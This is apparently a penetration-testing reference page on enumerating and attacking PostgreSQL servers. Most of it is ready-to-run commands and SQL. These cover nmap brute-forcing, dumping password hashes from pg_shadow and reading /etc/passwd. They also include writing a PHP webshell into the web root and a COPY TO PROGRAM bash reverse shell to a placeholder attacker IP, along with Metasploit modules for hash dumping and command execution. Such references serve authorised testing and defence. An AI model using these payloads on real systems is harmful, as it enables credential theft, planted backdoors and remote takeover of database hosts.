% Filename: 02-reconnaissance/enum-database/postgresql.md
% Display name: PostgreSQL Enumeration
% Last update: 2026-02-09
% ATT&CK Tactics: TA0043 (Reconnaissance)
% ATT&CK Techniques: T1595 (Active Scanning)
% Authors: @TristanInSec

# PostgreSQL Enumeration

## Overview

PostgreSQL runs on TCP 5432 by default. Enumeration targets version detection, authentication testing, database listing, credential extraction, and file read/write via built-in functions. PostgreSQL's `COPY` command and large object functions provide file system access when permissions allow, and the `postgres` superuser account is the primary target.

## ATT&CK Mapping

- **Tactic:** TA0043 - Reconnaissance
- **Technique:** T1595 - Active Scanning

## Prerequisites

- Network access to target TCP 5432
- `psql` client, Nmap, or Metasploit installed

## Enumeration Techniques

### Service Detection

```bash
# Nmap
# https://nmap.org/
nmap -sV -p 5432 <target>
```

Expected output:
```text
5432/tcp open  postgresql  PostgreSQL DB 15.2
```

### Nmap NSE Scripts

```bash
# Nmap
# https://nmap.org/
# Brute-force
nmap -p 5432 --script pgsql-brute <target>
```

PostgreSQL does not have a dedicated Nmap info script like other databases. Use `-sV` for version detection instead.

### psql Client Connection

```bash
# Connect with credentials
psql -h <target> -U <user> -d <database>

# Connect to default postgres database
psql -h <target> -U postgres

# Execute query directly
psql -h <target> -U <user> -d <database> -c 'SELECT version();'
```

If password authentication is required, `psql` prompts for the password. To pass it non-interactively, set the `PGPASSWORD` environment variable:

```bash
PGPASSWORD='<password>' psql -h <target> -U <user> -d <database>
```

### Database Enumeration

Once connected:

```sql
-- Server version
SELECT version();

-- Current user and privileges
SELECT current_user;
SELECT session_user;

-- Check if superuser
SELECT current_setting('is_superuser');

-- List databases
\l
SELECT datname FROM pg_database;

-- List tables in current database
\dt
SELECT tablename FROM pg_tables WHERE schemaname = 'public';

-- Describe table structure
\d <table>

-- List all users and roles
\du
SELECT usename, usesuper, usecreatedb FROM pg_user;
SELECT rolname, rolsuper, rolcanlogin FROM pg_roles;

-- List schemas
\dn
SELECT schema_name FROM information_schema.schemata;

-- Connection info
\conninfo
```

### Credential Extraction

```sql
-- Dump password hashes (superuser required)
SELECT usename, passwd FROM pg_shadow;
```

PostgreSQL uses MD5 hashes in the format `md5<hash>` where the hash is `MD5(password + username)`. Crackable with Hashcat mode 12 or John the Ripper (`postgres` or `dynamic_1034` format). PostgreSQL 10+ uses SCRAM-SHA-256 by default (`scram-sha-256` in `pg_hba.conf`) — those hashes are not stored in `pg_shadow` and require different handling.

### File Read/Write

If the user has superuser privileges:

```sql
-- Read a file
SELECT pg_read_file('/etc/passwd');

-- Alternative: read via COPY
CREATE TABLE tmp(content text);
COPY tmp FROM '/etc/passwd';
SELECT * FROM tmp;
DROP TABLE tmp;

-- Write a file (webshell example)
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
```

`pg_read_file()` is restricted to the data directory by default unless the user is superuser. `COPY TO/FROM` requires superuser and accesses the server filesystem.

### Command Execution

PostgreSQL supports command execution through the `COPY ... PROGRAM` syntax (PostgreSQL 9.3+):

```sql
-- Execute OS command (superuser required)
COPY (SELECT '') TO PROGRAM 'id';

-- Reverse shell
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1"';
```

### Configuration Files

| File | Location | Contains |
|------|----------|----------|
| postgresql.conf | /etc/postgresql/\<ver\>/main/ | Server configuration |
| pg_hba.conf | /etc/postgresql/\<ver\>/main/ | Authentication rules |
| .pgpass | ~/.pgpass | Saved credentials |
| pgadmin4.db | varies | PgAdmin saved connections |

```sql
-- Show configuration file locations
SHOW config_file;
SHOW hba_file;

-- Check authentication settings
SELECT pg_read_file('pg_hba.conf');
```

The `pg_hba.conf` file defines who can connect, from where, and how they authenticate. Finding `trust` entries means those connections require no password.

### Metasploit Modules

```bash
# Metasploit
# https://www.metasploit.com/
# Login testing
auxiliary/scanner/postgres/postgres_login

# Schema dump
auxiliary/scanner/postgres/postgres_schemadump

# Hash dump
auxiliary/scanner/postgres/postgres_hashdump

# Read files
auxiliary/admin/postgres/postgres_readfile

# Command execution
auxiliary/admin/postgres/postgres_sql
```

## Post-Enumeration

With PostgreSQL access, prioritize:
- Check superuser status — if yes, file read/write and command execution are available
- Password hashes from `pg_shadow` for offline cracking
- `pg_hba.conf` for trust relationships and authentication weaknesses
- `.pgpass` files in home directories for saved credentials
- COPY ... PROGRAM for OS command execution (PostgreSQL 9.3+)
- Database contents — application credentials, user data, connection strings to other systems

## References

### Official Documentation

- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
- [PostgreSQL COPY Command Reference](https://www.postgresql.org/docs/current/sql-copy.html)
- [Nmap pgsql-brute NSE Script](https://nmap.org/nsedoc/scripts/pgsql-brute.html)
- [Rapid7 — PostgreSQL COPY FROM PROGRAM Command Execution Module](https://www.rapid7.com/db/modules/exploit/multi/postgres/postgres_copy_from_program_cmd_exec/)

### Pentest Guides & Research

- [PayloadsAllTheThings — PostgreSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)
- [Hacking Articles — Penetration Testing on PostgreSQL (5432)](https://www.hackingarticles.in/penetration-testing-on-postgresql-5432/)
- [OffSec — PostgreSQL Exploit](https://www.offsec.com/blog/postgresql-exploit/)
- [pentestmonkey — Cracking Postgres Password Hashes](https://pentestmonkey.net/blog/cracking-postgres-hashes)

### CVE References

- [CVE-2019-9193 — PostgreSQL COPY TO/FROM PROGRAM Authenticated RCE](https://nvd.nist.gov/vuln/detail/CVE-2019-9193)

### MITRE ATT&CK

- [T1595 — Active Scanning](https://attack.mitre.org/techniques/T1595/)
- [T1059.004 — Command and Scripting Interpreter: Unix Shell](https://attack.mitre.org/techniques/T1059/004/)
